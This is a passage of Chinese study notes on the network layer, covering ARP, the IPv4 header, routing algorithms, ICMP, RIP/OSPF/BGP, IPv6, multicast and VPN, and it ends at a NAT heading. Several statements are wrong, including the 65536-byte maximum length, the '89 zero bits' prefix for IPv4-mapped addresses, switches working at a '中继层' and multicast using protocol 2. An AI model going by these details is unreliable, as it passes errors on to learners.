从**层次**的角度看， **硬件地址（MAC 地址）**（或物理地址）是**数据链路层**和**物理层**使用的地址。 **IP 地址**是**网络层和以上各**层使用的地址，是一种**逻辑地址**（称 IP 地址是逻辑地址是因为 IP 地址是用**软件实现**的）。 IP 数据报一旦交给了**数据链路层**就被封装成了 **MAC 帧**，**硬件地址**放在 **MAC 帧**的首部。

<img src="assets/image-20191214210738078.png" alt="image-20191214210738078" style="zoom:50%;" />

**路由器只根据目的主机的 IP 地址的网络号进行路由选择**。在**具体的物理网络的链路层只能看见 MAC 帧而看不见 IP 数据报。在 IP 层抽象的互联网上只能看到 IP 数据报。** **IP 地址放在 IP 数据报的首部，而硬件地址放在 MAC 帧的首部。在网络层和网络层以上使用的是 IP地址，而数据链路层及以下使用的是硬件地址。**整个 IP 数据报成为 MAC 帧中的数据部分，因而在**数据链路层看不见数据报的 IP 地址**。

<img src="assets/image-20191214210714415.png" alt="image-20191214210714415" style="zoom:60%;" />

**IP 数据报**的首部的**源地址和目的地址**是**不变**的，而 **MAC 帧**首部中的 **MAC 源地址和目的地址**却是在**不断变换**的（通过不同的网络）。IP 层**抽象**的互联网**屏蔽**了下层很复杂的细节，在抽象的网络层上讨论问题，就能够使用统一的、抽象的 IP 地址研究主机和主机或主机和路由器之间的通信。

<img src="assets/image-20191214211627754.png" alt="image-20191214211627754" style="zoom:60%;" />

##### 4. 地址解析协议ARP

###### (1) 概述

知道了 MAC 地址和 IP 地址的区别及工作层次后，不禁又产生了疑问：主机或路由器怎么知道应当在 **MAC 帧**的首部填入什么样的**硬件地址**？路由器中的**路由表**又是怎么得出的？

先来看第一个问题，第一个问题的答案就是使用**==地址解析协议APR==：从网络层使用的 ==IP 地址解析==出在数据链路层使用的 ==MAC 硬件地址==**，然后将 MAC 地址放到 MAC 帧的首部。

它是怎么解析的？每一个主机都设有一个 ==**ARP 高速缓存**== (ARP cache)（通过广播发送 APR 请求分组类似以太网交换机），里面有所在的局域网上的各主机和路由器的 **IP 地址**到**硬件地址（MAC 地址）**的**映射表**。

**APR 高速缓存的作用**：存放最近获得的 IP 地址到 MAC 地址的绑定，以**减少 ARP 广播的数量**。

APR **要点**：不管在网络层上使用的是什么协议，在实际**网络的链路**上传送数据帧时，最终还是必须使用**硬件地址**。==**ARP** 是解决**同一个局域网**上的**主机**或**路由器**的 **IP 地址**和硬件地址的**映射**问题。== **如果所要找的主机和源主机不在同一个局域网上，那么就要通过 ARP 找到一个位于本局域网上的某个==路由器==的硬件地址，然后把分组发送给这个路由器，让这个路由器把分组转发给下一个网络。剩下的工作就由==下一个网络==来做**。

> **既然在网络链路上传送的帧最终是按照硬件地址找到目的主机的，那么为什么还要使用抽象的 IP 地址？**

这是因为 IP 地址的分配是根据网络的**拓朴结构**，而不是根据谁制造了网络设置。若将高效的路由选择方案建立在设备制造商的基础上而不是网络所处的拓扑位置基础上，这种方案是不可行的。由于全世界存在着**各式各样的网络**，它们使用**不同的硬件地址**。要使这些**异构网络**能够互相通信就必须进行**非常复杂的硬件地址转换**工作，因此几乎是不可能的事。所以还是要通过 IP 地址来使这个问题简单化，总之，在虚拟的 IP 网络上用 IP 地址进行通信给广大的计算机用户带来了很大的方便。

网络层实现**主机之间的通信**，而链路层实现具体每段链路之间的通信。因此在通信过程中，**IP 数据报的源地址和目的地址始终不变**，而 **MAC 地址**随着链路的**改变而改变**。

<img src="assets/image-20191214211651342.png" alt="image-20191214211651342" style="zoom: 50%;" />

###### (2) ARP工作流程

==**ARP 实现由 IP 地址得到 MAC 地址。**==

<img src="assets/image-20191214211445483.png" alt="image-20191214211445483" style="zoom: 43%;" />

如果主机 A 知道主机 B 的 **IP 地址**，但是 ARP 高速缓存中**没有**该 IP 地址到 MAC 地址的**映射**，此时主机 A 通过**广播的方式发送 ARP 请求分组**，主机 B 收到该请求后会发送 ARP 响应分组给主机 A **告知其 MAC 地址**，随后主机 A 向其 ARP 高速**缓存中写入**主机 B 的 IP 地址到 MAC 地址的**映射**。

<img src="assets/image-20191214211400994.png" alt="image-20191214211400994" style="zoom:50%;" />

<img src="assets/image-20191214211412751.png" alt="image-20191214211412751" style="zoom:50%;" />

##### 5. IP数据报的格式

一个 **IP 数据报**由**首部和数据**两部分组成。 **首部**的**前一部分是固定**长度，共 **20** 字节，是**所有 IP 数据报必须具有**的。 在首部的固定部分的后面是一些可选字段，其长度是可变的。

<img src="assets/image-20191214211722397.png" alt="image-20191214211722397" style="zoom: 55%;" />

-  **版本**  : 有 4（IPv4）和 6（IPv6）两个值。
-  **首部长度**  : 占 **4 位**，因此最大值为 15。值为 1 表示的是 1 个 32 位字的长度，也就是 4 字节。因为固定部分长度为 20 字节，因此该值最小为 5。如果可选字段的长度不是 4 字节的整数倍，就用尾部的**填充**部分来填充。
-  **区分服务**  : 用来获得更好的服务，一般情况下不使用。
-  **总长度**  : 包括首部长度和数据部分长度。最长 **65536** 字节，但是总长度也不能超过**数据链路层**的**最大传输单元 MTU** 的长度，超过需要对数据报进行**分片**处理。
-  **生存时间**  ：==**TTL**==，它的存在是为了防止无法交付的数据报在互联网中不断兜圈子。以路由器**跳数**为单位，经过一个路由器就会**减 1**。当 **TTL 为 0** 时就**丢弃**数据报。TTL 为 1 则只能在**本局域网**中传播。
-  **协议** ：指出携带的数据应该上交给**什么协议**进行处理，例如 ICMP、TCP、UDP 、IP、IPv6、OSPF 等。
-  **首部检验和** ：由于数据报每经过一个**路由器**，都要重新**计算检验和**，因此检验和不包含数据部分可以减少计算的工作量。
-  **标识**  : 在数据报长度过长从而发生**分片**的情况下，相同数据报的不同分片具有**相同的标识符**。
-  **片偏移**  : 和标识符一起，用于发生**分片**的情况。片偏移的**单位**为 8 字节。各分出的数据片需要复制原来的头部信息但是改一下片偏移信息，由此判断不同分片属于同一个数据报。
-  **源地址**：4 字节。
-  **目的地址**：4 字节。

-  **可选字段**：长度可变，从 1 个字节到 40 个字节不等，取决于所选择的项目，用来支持排错、测量以及安全等措施，内容很丰富。填充部分，用 0 填充使可选字段的长度是 4 字节的整数倍。

##### 6. IP层转发分组的流程

在 IP 层转发分组是通过查找**路由表**来实现的，那么为什么通过**查找路由表**就可以知道该**怎么转发分组**呢？路由表里又存储的是什么呢？ 

假设：有四个 A 类网络通过**三个路由器**连接在一起。每一个网络上都可能有成千上万个主机。 可以想像，若按目的主机号来制作路由表，每一个路由表就有 4 万个项目，即 4 万行（每一行对应于一台主机），则所得出的路由表就会过于**庞大**。 但若按主机所在的**网络地址**来制作路由表，那么每一个路由器中的路由表就**只包含 4 个项目**（每一行对应于一个**网络**），这样就可使路由表大大**简化**。

在路由表中，对每一条路由，最重要的就是**：目的网络地址，下一跳地址**。

<img src="assets/image-20191214211806309.png" alt="image-20191214211806309" style="zoom:50%;" />

**特点**：根据目的**网络地址**就能确定**下一跳路由器**，这样做的结果是： **IP 数据报最终一定可以找到目的主机所在目的网络上的路由器（可能要通过多次的间接交付）**。 只有到达**最后一个路由器**时，才试图向目的主机进行**直接交付**。

- **特定主机路由**：虽然互联网所有的分组转发都是基于**目的主机**所在的**网络**，但在大多数情况下都允许有这样的特例，即为特定的目的主机**指明一个路由**。 采用特定主机路由可使网络管理人员能更方便地控制网络和测试网络，同时也可在需要考虑某种安全问题时采用这种特定主机路由。

- **默认路由**：路由器还可采用**默认路由**以减少路由表所占用的空间和搜索路由表所用的时间。 这种转发方式在一个网络只有**很少的对外连接**时是很有用的。 默认路由在主机发送 IP 数据报时往往更能显示出它的好处。 如果一个主机连接在一个小网络上，而这个网络只用一个路由器和互联网连接，那么在这种情况下使用**默认路由**是非常合适的。

**路由器分组转发算法**：

- (1) 从数据报的**首部**提取**目的**主机的 **IP 地址 D**, 得出目的**网络地址为 N**。 
- (2) 若网络 N 与此**路由器直接相连**，则把数据报**直接交付**目的主机 D；否则是**间接交付**，执行 (3)。
- (3) 若路由表中有目的地址为 D 的**特定主机路由**，则把数据报传送给**路由表中所指明的下一跳路由器**；否则，执行 (4)。 
- (4) 若路由表中有到达网络 N 的路由，则把数据报传送给路由表指明的**下一跳**路由器；否则，执行 (5)。 
- (5) 若路由表中有一个**默认路由**，则把数据报传送给路由表中所指明的**默认路由器**；否则，执行 (6)。 
- (6) 报告转发分组**出错**。

Tips: 当**路由器**收到待转发的数据报，不是将下一跳路由器的 IP 地址填入 IP 数据报，而是送交下层的**网络接口软件**。 网络接口软件使用 **ARP** 负责将**下一跳路由器的 IP 地址**转换成**硬件地址**，并将此硬件地址放在链路层的 **MAC 帧的首部**，然后根据这个**硬件地址找到下一跳路由器**。

**使用子网时分组的转发**

前面已经提到在不划分子网时的分组转发，那么在划分子网后又该怎么转发分组？可以知道这两者的区别**仅仅**在于能不能**直接得到目的地址的网络地址**。划分子网后，**网络地址**不仅取决于 IP 地址，还要取决于**子网掩码**。所以转发**分组算法**如下：

- (1) 从收到的分组的首部提取**目的 IP 地址 D**。
- (2) 先用各网络的**子网掩码和 D 逐位相“与”**，看是否和相应的网络地址匹配。若匹配，则将分组**直接交付**。否则就是间接交付， 执行 (3)。、
- (3) 若路由表中有目的地址为 D 的特定主机路由，则将分组传送给指明的下一跳路由器；否则，执行 (4)。 
- (4) 对路由表中的每一行，将**子网掩码和 D 逐位相“与**”。若结果与该行的目的网络地址匹配，则将分组传送给该行指明的下一跳路由器；否则，执行 (5)。 
- (5) 若路由表中有一个**默认路由**，则将分组传送给路由表中所指明的默认路由器；否则，执行 (6)。 
- (6) 报告转发分组出错。



#### 网际控制报文协议ICMP

**ICMP 是检测传输网络是否通畅、主机是否可达、路由是否可用等网络运行状态的协议。**它不传输用户数据，但是对于**评估网络健康状态**非常重要。

它**封装**在 IP 数据报中，但是**不属于**高层协议。

##### 1. ICMP的种类

ICMP 报文的种类有**两种**，即 ==**ICMP 差错报告报文**和 **ICMP 询问报文**==。 报文类型如下。

ICMP **差错报告**报文共有 4 种：**终点不可达**、**时间超过**、**参数问题**、 **改变路由（重定向）(Redirect)** 。

ICMP **询问报文**有 2 种：回送请求和回答报文，时间戳和回答报文 。

| ICMP 报文类型 |  类型的值  |           ICMP 报文的类型           |
| :-----------: | :--------: | :---------------------------------: |
| 差错报告报文  |     3      |           **终点不可达**            |
| 差错报告报文  |     11     |            **时间超过**             |
| 差错报告报文  |     12     |            **参数问题**             |
| 差错报告报文  |     5      |       **改变路由（重定向）**        |
| **询问报文**  | **8 或 0** | **回送（Echo）请求或应答 （ping）** |
|   询问报文    |  13 或 14  |          时间戳请求或应答           |

##### 2. ICMP报文格式

ICMP 报文的前 4 个字节是统一的格式，共有三个字段：即**类型**、**代码**和**检验和**。接着的 4 个字节的内容与 ICMP 的类型有关。 

<img src="assets/image-20191219214607503.png" alt="image-20191219214607503" style="zoom:50%;" />

**ICMP 差错报告报文**的数据字段的内容如下图。

<img src="assets/image-20191219214624163.png" alt="image-20191219214624163" style="zoom:50%;" />

##### 3. ICMP协议应用举例

###### (1) Ping

Ping 是 **ICMP** 的一个重要应用，主要用来测试两台主机之间的**连通性**。

Ping 的原理是通过向目的主机发送 **ICMP Echo 请求报文**，目的主机收到之后会发送 **Echo 回答报文**。Ping 会根据时间和成功响应的次数估算出数据包往返时间以及丢包率。

###### (2) Traceroute

**Traceroute** 是 ICMP 的另一个应用，用来跟踪一个**分组从源点到终点的路径**。Traceroute 发送的 IP 数据报**封装**的是无法交付的 **UDP 用户数据报**，并由目的主机发送终点不可达差错报告报文。

- 源主机向目的主机发送一连串的 IP 数据报。第一个数据报 P1 的生存时间 TTL 设置为 1，当 P1 到达路径上的第一个路由器 R1 时，R1 收下它并把 TTL 减 1，此时 TTL 等于 0，R1 就把 P1 丢弃，并向源主机发送一个 ICMP 时间超过差错报告报文。
- 源主机接着发送第二个数据报 P2，并把 TTL 设置为 2。P2 先到达 R1，R1 收下后把 TTL 减 1 再转发给 R2，R2 收下后也把 TTL 减 1，由于此时 TTL 等于 0，R2 就丢弃 P2，并向源主机发送一个 ICMP 时间超过差错报文。
- 不断执行这样的步骤，直到最后一个数据报刚刚到达目的主机，主机不转发数据报，也不把 TTL 值减 1。但是因为数据报封装的是无法交付的 UDP，因此目的主机要向源主机发送 ICMP 终点不可达差错报告报文。
- 之后源主机知道了到达目的主机所经过的路由器 IP 地址以及到达每个路由器的往返时间。



#### 路由选择协议

##### 1. 概述

**路由协议**就是讨论**路由表**是怎么得到的。 

理想的路由算法特点：算法必须是正确的和完整的，且在计算上应简单；应能适应通信量和网络拓扑的变化，也就是要有**自适应性**；算法应具有稳定性。 

互联网采用**分层次**的**路由选择协议**，因为互联网的规模非常大，而且许多单位不希望暴露自己内部的网络的布局细节。 

所以可以把互联网划分为许多个小的==**自治系统**==（Autonomous System）**AS**：一**个 AS 对其他 AS 表现出的是一个单一的和一致的路由选择策略**。 

互联网的**两大类**路由选择协议：

<img src="assets/image-20191219214749864.png" alt="image-20191219214749864" style="zoom:50%;" />

- **内部网关协议 IGP**（Interior Gateway Protocol）：具体协议有 **RIP 协议，OSPF 协议**等。
- **外部网关协议 EGP** (Extern Gateway Protocol）：具体协议有 **BGP**。

<img src="assets/image-20191219214837958.png" alt="image-20191219214837958" style="zoom:35%;" />

上图显示，一个**自治系统内部**可以使用**不同的内部网关协议**，如 **RIP 协议、OSPF 协议**。两个**自治系统之间**使用**外部网关协议**进行路由选择，如 **BGP 协议**。

##### 2. 内部网关协议之RIP

RIP 是一种**分布式的、==基于距离向量==**的路由选择协议。 RIP 协议要求网络中的**每一个路由器**都要维护从**它自己到其他每一个**目的网络的**距离记录**。RIP 认为一个好的路由就是它通过的**路由器的数目少**，即“**距离短**”。 **RIP 允许一条路径最多只能包含 ==15== 个路由器**。 “距离”的最大值为 16 时即相当于**不可达**。RIP 选择一个具有**最少路由器的路由**（即**最短路由**），哪怕还存在另一条**高速**(低时延)但路由器较多的路由。可见 **RIP 只适用于==小型互联网==**。 **RIP 不能在两个网络之间同时使用多条路由**。

**RIP 的三个特点**：

- 仅和**相邻路由器**交换信息。
- 交换的信息是当前本路由器所知道的**全部信息**，即自己的路由表。 
- 按**固定的时间间隔**交换路由信息，例如每隔 30 秒。当网络拓扑发生变化时，路由器也及时向**相邻路由器**通告拓扑变化后的路由信息。

**路由表的建立（**通过距离向量算法**）**：路由器在刚刚开始工作时，它的路由表是空的，**只知道到直接连接的网络的距离**（此距离定义为 1）。以后**每一个路由器也只和数目非常有限的相邻路由器交换并更新路由信息。 经过若干次更新后，所有的路由器最终都会知道到达==本自治系统中任何一个网络==的最短距离和下一跳路由器的地址**。

**距离向量算法**的基础就是 **==Bellman-Ford==** 算法，要点：设 X 是结点 A 到 B 的最短路径上的一个结点。 若把路径 A→B 拆成两段路径 A→X 和 X→B，则每一段路径 A→X 和 X→B 也都分别是结点 A 到 X 和结点 X 到 B 的最短路径。

RIP 协议的报文结构如下图，报文由首部与路由组成。RIP 协议使用运输层的用户数据报 **UDP** 进行传送。

<img src="assets/image-20191219215002343.png" alt="image-20191219215002343" style="zoom:50%;" />

**RIP 协议特点**：==**好消息传播得快，坏消息传播得慢**==。 RIP 存在的一个问题：当网络出现**故障**时，要经过比较长的时间 (例如数分钟) 才能将此信息传送到所有的路由器（坏消息传的慢）。仅适用于规模小的网络。 其最大的优点是实现简单，开销较小。

##### 3. 内部网关协议之OSPF

###### (1) 概述

**开放最短路径优先 OSPF** (Open Shortest Path First)是为克服 RIP 的缺点在 1989 年开发出来的。**适用于==规模较大==的网络**。 **OSPF** 最主要的特征就是使用**分布式的链路状态控制协议**，而不是像 RIP 那样的**距离向量协议**。

和 RIP 不同的是： 

（1）向本自治系统中**所有路由器**发送信息，这里使用的方法是**洪泛法**。 

（2）发送的信息就是与本路由器**相邻**的所有路由器的链路状态，但这只是路由器所知道的**部分信息**。 

（3）只有当**链路状态发生变化**时，路由器才向所有路由器使用**洪泛法**发送此消息。

**链路状态数据库**：由于各路由器之间**频繁地**交换链路状态信息，因此**所有的路由器**最终都能建立一个**链路状态数据库**。 这个数据库实际上就是==**全网的拓扑结构图**==，它在**全网范围内是一致**的（这称为链路状态数据库的同步）。 OSPF 的链路状态数据库能**较快地进行更新**，使各个路由器能及时更新其路由表。OSPF 的**更新过程收敛得快**是其重要的**优点**。 

OSPF 的**区域**：为了使 OSPF 能够用于**规模很大**的网络。OSPF 将一个**自治系统再划分为若干个更小的范围**，叫做**区域**。 每一个区域都有一个 32 位的区域标识符（用点分十进制表示）。 区域也不能太大，在一个区域内的路由器最好不超过 200 个。 如下图。路由器就可以分为主干路由器和区域边界路由等。

<img src="assets/image-20191219215028484.png" alt="image-20191219215028484" style="zoom:50%;" />

###### (2) 工作原理

OSPF 简单说就是两个相邻的路由器通过发**报文的形式成为邻居关系**，邻居再**相互发送链路状态**信息形成邻接关系，之后各自根据**最短路径算法**算出路由，放在 **OSPF 路由表**，OSPF 路由与其他路由比较后优的加入**全局路由表**。整个过程使用了五种报文、三个阶段、四张表。 

|   类型   |                             含义                             |
| :------: | :----------------------------------------------------------: |
| 五种报文 |                Hello 报文：建立并维护邻居关系                |
|          |                DBD 报文：发送链路状态头部信息                |
|          | LSR 报文：把从 DBD 中找出需要的链路状态头部信息传给邻居，请求完整信息 |
|          |    LSU 报文：将 LSR 请求的头部信息对应的完整信息发给邻居     |
|          |               LSACK：收到 LSU 报文后确认该报文               |
| 三个阶段 |          邻居发现：通过发送 Hello 报文形成邻居关系           |
|          |         路由通告：邻居间发送链路状态信息形成邻接关系         |
|          |             路由计算：根据最短路径算法算出路由表             |
|  四张表  |              邻居表：主要记录形成邻居关系路由器              |
|          |               链路状态数据库：记录链路状态信息               |
|          |             OSPF 路由表：通过链路状态数据库得出              |
|          |             全局路由表：OSPF 路由与其他比较得出              |

OSPF **不用 UDP** 而是**直接使用 IP 数据报**传送，可以减少路由信息的通信量。OSPF 分组被当成 IP 数据报的数据部分。

##### 4. 外部网关协议之BGP

**BGP**（Border Gateway Protocol，边界网关协议）。BGP 是**不同自治系统的路由器之间**交换路由信息的协议，采用了**路径向量路由选择协议**。 BGP 只能尽量寻找一条**比较好**的路由，而**不是最佳**路由。

AS **之间**的路由选择**很困难**，主要是由于：

- 互联网规模很大；
- 各个 AS 内部使用**不同**的路由选择协议，无法准确定义路径的度量；
- AS 之间的路由选择必须考虑有关的策略，比如有些 AS 不愿意让其它 AS 经过。

**每个 AS** 都必须配置 **BGP 发言人**，通过在两个相邻 BGP 发言人之间**建立 TCP 连接**来交换路由信息。 

**BGP发言人**：每一个自治系统的管理员要选择至少一个**路由器**作为该自治系统的“ **BGP 发言人**” (BGP Speaker) 。 一般说来，两个 BGP 发言人都是通过一个**共享网络**连接在一起的，而 BGP 发言人往往就是 **BGP 边界路由器**，但也可以不是 BGP 边界路由器。 每个 BGP 发言人除了运行 BGP 协议外，还必须运行该自治系统所使用的**内部网关协议**，如 OSPF 或 RIP 协议。

<img src="assets/image-20191219215052920.png" alt="image-20191219215052920" style="zoom:50%;" />

##### 5. 路由器

路由器是一种具有**多个输入端口和多个输出端口**的专用计算机，其任务是**转发分组**。也就是说，将**路由器某个输入端口收到的分组**，按照分组要去的目的地（即目的网络），把该**分组从路由器的某个合适的输出端口转发给下一跳路由器**。

路由器是一种典型的==**网络层**==设备，所以路由器只有下面**三层协议**，因为路由器位于网络核心中，不需要为进程或者应用程序提供服务，因此也就不需要传输层和应用层。路由器从功能上可以划分为：**路由选择和分组转发**，转发分组只涉及到**网络层**。

典型路由器结构如下图所示。分组转发结构由三个部分组成：**交换结构、一组输入端口和一组输出端口**。

<img src="assets/image-20191219215112833.png" alt="image-20191219215112833" style="zoom:55%;" />

**转发和路由选择**的区别：“**转发**”(forwarding) 就是路由器根据转发表将用户的 IP 数据报**从合适的端口转发**出去。“**路由选择**”(routing) 则是按照**分布式算法**，根据从各相邻路由器得到的关于网络拓扑的变化情况，动态地改变所选择的路由。 **路由表是根据路由选择算法得出的**，而**转发表是从路由表得出的**。 在讨论路由选择的原理时，往往不去区分转发表和路由表的区别。

路由器的**输入端口**里面装有**物理层、数据链路层和网络层的处理模块**。 数据链路层剥去帧首部和尾部后，将分组送到网络层的队列中排队等待处理，这会产生一定的时延。

若接收到的分组是路由器之间交换路由信息的分组（如 RIP 或 OSPF 分组），则把这种分组交给路由器中路由选择部分的路由选择处理机进行处理。若接收到的分组是数据分组，则按照分组首部中的目的地址查找转发表，根据结果分组就经过交换机构到达合适的输出端口。

##### 6. 交换机和路由器的区别

- 集线器、**交换机**都是做**端口扩展的**，就是**扩大局域网**(通常都是以太网)的接入点，也就是能让局域网可以连进来更多的电脑。而**路由器**是用来做**网间连接**，也就是用来连接不同的局域网络。
- **交换机**工作在**中继层**，交换机**根据 MAC 地址寻址**。路由器工作在**网络层**，根据 **IP 地址寻址**，路由器可以处理 TCP/IP 协议，而交换机不可以。IP 地址是在软件中实现，MAC 地址通常是硬件自带的。
- 路由器提供**防火墙**的服务，交换机不能提供该功能。路由器仅仅转发特定地址的数据包，不传送不支持路由协议的数据包传送和未知目标网络数据包的传送，从而可以防止广播风暴。



#### IPv6

##### 1. IPv6格式

IPv6 仍支持**无连接**的传送，但将协议数据单元 **PDU** 称为**分组**。IPv6 数据报由两大部分组成： **基本首部** (base header) **有效载荷**(payload)。有效载荷也称为净负荷，有效载荷允许有零个或多个扩展首部 (extension header)，再后面是数据部分。 

<img src="assets/image-20191219215144136.png" alt="image-20191219215144136" style="zoom:56%;" />

IPv6 将首部长度变为**固定的 40 字节**，称为**基本首部**。 把首部中不必要的功能取消了，使得 IPv6 首部的字段数减少到只有 8 个。 IPv6 对首部中的某些字段进行了如下的更改： 

<img src="assets/image-20191219215200177.png" alt="image-20191219215200177" style="zoom:45%;" />

<img src="assets/image-20191219215213585.png" alt="image-20191219215213585" style="zoom:50%;" />

- **版本**(version)：4 位。它指明了协议的版本，对 IPv6 该字段总是 6。 

- **通信量类(**traffic class)：8 位。这是为了区分不同的 IPv6 数据报的类别或优先级。目前正在进行不同的通信量类性能的实验。
- **流标号**(flow label)：20 位。**“流”**是互联网络上从特定源点到特定终点的一系列数据报， “流”所经过的路径上的路由器都保证指明的服务质量。所有属于同一个**流的数据报都具有同样的流标号**。 
- **有效载荷长度**(payload length)：16 位。它指明 IPv6 数据报除基本首部以外的字节数（所有扩展首部都算在有效载荷之内），其最大值是 64 KB。 
- **下一个首部**(next header)：8 位。它相当于 IPv4 的协议字段或可选字段。 
- **跳数限制**(hop limit)：8 位。源站在数据报发出时即设定跳数限制。路由器在转发数据报时将跳数限制字段中的值减 1。 当跳数限制的值为零时，就要将此数据报丢弃。 
- **源地址**：128 位。是数据报的发送站的 IP 地址。 
- **目的地址**：128 位。是数据报的接收站的 IP 地址。 

##### 2. IPv6地址

###### (1) 概述

一个 IPv6 数据报的**目的地址**可以是以下三种基本类型地址之一：

- **单播**(unicast) 传统的点对点通信。
- **多播**(multicast) 多播是一对多点的通信，数据报发送到一组计算机中的每一个。IPv6 没有广播的术语，而是将广播看作多播的一个特例。
- **任播**(anycast) IPv6 增加的一种类型。任播的终点时一组计算机，但数据报只交付给其中的一个，通常是距离最近的一个。

IPv6 把网络中的**主机和路由器**均称为**结点**。IPv6 给结点的每一个接口指派一个 IP 地址，一个结点可以有多个单播地址，而其中的任何一个地址都可以当作到达该结点的目的地址。 

###### (2) 冒号十六进制记法

为了使地址再简洁，IPv6 使用**冒号十六进制记法**(colon hexadecimal notation，简写为 colon hex)，把每个 **16 位**的值用**十六进制**表示，各值之间用**冒号**分隔。冒号十六进制记法可以允许**零压缩**(zero compression)，即一连串连续地零可以用**一对冒号**取代，如 FF05:0:0:0:0:0:0:B3，可以写成：FF05::B3。在任一地址中只能**使用一次**零压缩。

###### (3) IPV6特殊地址

- **未指明地址**：16 字节的**全 0 地址**，可缩写为两个冒号 **“::”**，这个地址**不能用作目的**地址，而只能为某个主机当作源地址使用，条件是这个主机还没有配置到一个标准的 IP 地址。
- **环回地址**：IPv6 的环回地址是 0:0:0:0:0:0:0:1(即 **::1**)，作用和 IPv4 的环回地址一样。
- **基于 IPv4 的地址**：前缀为 0000 0000 保留一小部分地址作为与 IPv4 兼容的，这是因为必须要考虑到比较长的时期 IPv4 和 IPv6 将会同时存在，而有的结点不支持 IPv6，因此数据报在这两类结点之间转发时，就必须进行地址的转换。把 IPv4 地址嵌入到 IPv6 的方法：前 89 位为 0 接着 16 位全是1，然后是嵌入 IPv4 地址，这种地址叫做“IPv4 **映射**的 IPv6 地址”。
- **本地链路单播地址**(Link-Local Unicast Address)：有些组织的网络使用 TCP/IP 协议，但并没有连接到因特网上。连接在这样的网络上的主机都可以使用这种本地地址进行通信，但不能和因特网上的其它主机通信。
- **全球单播地址**：使用最多的一类。可以分为三级，用 n 比特作为全球路由选择前缀，用 m 比特作为子网前缀。剩下的 128 - m - n 位比特作为接口标识符。

##### 3. IPv6的过渡

向 IPv6 过渡只能采用**逐步演进**的办法，同时，还必须使新安装的 IPv6 系统能够向后兼容：IPv6 系统必须能够接收和转发 IPv4 分组，并且能够为 IPv4 分组选择路由。 两种向 IPv6 过渡的策略： 

- **使用双协议栈** 
- **使用隧道技术**

###### (1) 双协议栈

双协议栈 (dual stack) 是指在完全过渡到 IPv6 之前，使一部分主机（或路由器）装有**两个协议栈**，**一个 IPv4 和一个 IPv6**。 双协议栈的主机（或路由器）记为 IPv6/IPv4，表明它同时具有**两种 IP 地址**：一个 IPv6 地址和一个 IPv4 地址。 双协议栈主机在和 IPv6 主机通信时是采用 IPv6 地址，而和 IPv4 主机通信时就采用 IPv4 地址。 根据 DNS 返回的地址类型可以确定使用 IPv4 地址还是 IPv6 地址。 

<img src="assets/image-20191219215236599.png" alt="image-20191219215236599" style="zoom:56%;" />

###### (2) 隧道技术

在 IPv6 数据报要**进入 IPv4 网络**时，把 IPv6 数据报**封装**成为 IPv4 数据报，整个的 IPv6 数据报变成了 IPv4 数据报的**数据部分**。 当 IPv4 数据报离开 IPv4 网络中的**隧道**时，再把数据部分（即原来的 IPv6 数据报）交给主机的 IPv6 协议栈。 从 BCD 中通过就像通过隧道一样。注意在隧道中传送的数据的数据报的源地址是 B 而目的地址是 E。

<img src="assets/image-20191219215250126.png" alt="image-20191219215250126" style="zoom:50%;" />

###### 4. ICMPv6

IPv6 也需要使用 ICMP 来反馈一些差错信息，新的版本即为 **ICMPv6**，它是面向报文的协议，它利用报文来报告差错，获取信息，探测邻站或管理多播通信等。



#### IP多播

**IP 多播**直观上可以按照下图理解，源主机只需要发送**一份数据**，而网络中的**路由器**在转发该数据时需要将它**复制多份**，分别发给在该个多播组内的**所有主机**。也就是说，IP多播必须依赖于**多播路由器**，这些路由器具有识别多播包的功能，当然，多播路由器也能转发单播包。 

<img src="assets/image-20191219215354107.png" alt="image-20191219215354107" style="zoom:50%;" />

IP 网络中每个主机都有自己唯一的 IP 地址（为简化问题，这里忽略 NAT，只考虑公共 IP），那如何让一个多播数据包到达该多播组内的多台主机呢？肯定不能将这么多主机的 IP 地址都写入该多播数据包的目的 IP 包头域（长度限制），而是在该多播数据包的目的 IP 地址域中写入 D 类地址（224.0.0.0—239.225.225.225 前 4 bit固定为 1110），**每个 D 类地址对应一个多播组**，则 D 类地址可以标志 2^28 个多播组。因此多播数据包与一般的**单播广播数据包的区别**是它的**目的 IP 地址为 D 类地址**，并且 IP 首部中的协议字段为 2，表明采用的是 IGMP 网际组管理协议。（需要注意的是多播数据包的目的 IP 地址实际上不可能对应某一台真实存在的主机的 IP 地址，也就是说该目的 IP 地址永远不可能作为源地址，即**多播 IP 地址只能用于目的 IP 地址，不能用于源 IP 地址**）。

PING 后面加多播地址就收不到响应。

**网际组管理协议 IGMP 和多播路由选择协议**

- IGMP 协议是让连接在本地局域网上的多播路由器知道本局域网上是否有主机参与或退出了某个多播组。

- IGMP 用于支持主机和路由器进行多播的网际组管理协议。



#### 虚拟专用网VPN

由于 IP 地址的**紧缺**，一个机构能申请到的 IP 地址数往往远**小于**本机构所拥有的主机数，并且一个机构并不需要把所有的主机接入到外部的互联网中，机构内的计算机可以使用仅在**本机构有效的 IP 地址**（专用地址）。

有三个专用地址块：

- **10.0.0.0 \~ 10.255.255.255**
- **172.16.0.0 \~ 172.31.255.255**
- **192.168.0.0 \~ 192.168.255.255**

这些地址仅在**本机构内**使用，也叫本地地址，或叫**可重用地址**。在互联网中的**路由器对目的地址是专用地址的数据报一律不进行转发。**

VPN 使用公用的互联网作为本机构各**专用网**之间的通信载体。专用指机构内的主机只与本机构内的其它主机通信；虚拟指好像是，而实际上并不是，它有经过公用的互联网。

VPN 的构建：如果专用网不同网点之间的通信必须经过公用的互联网，但又有**保密的要求**（使用 **IPSec 协议**），那么所有通过互联网传送的数据都必须**加密**。 一个机构要构建自己的 VPN 就必须为它的每一个场所购买**专门的硬件和软件**，并进行配置，使每一个场所的 VPN 系统都知道其他场所的地址。 

下图使用 **==IP 隧道技术==**实现 VPN，场所 A 和 B 的通信经过互联网，如果场所 A 的主机 X 要和另一个场所 B 的主机 Y 通信，IP 数据报的源地址是 **10.1.0.1**，目的地址是 **10.2.0.3**。数据报先发送到与互联网相连的路由器 **R1**，R1 对内部数据进行加密，然后重新加上数据报的首部，**源地址**是路由器 R1 的**全球地址 125.1.2.3**，**目的地址**是路由器 R2 的**全球地址 194.4.5.6**。路由器 R2 收到数据报后将数据部分进行解密，恢复原来的数据报，此时**目的地址为 10.2.0.3**，就交付给 Y。

<img src="assets/image-20191219215421313.png" alt="image-20191219215421313" style="zoom:52%;" />



#### 网络地址转换NAT

```
问题：在专用网上使用专用地址的主机如何与互联网上的主机通信（并不需要加密）？
```

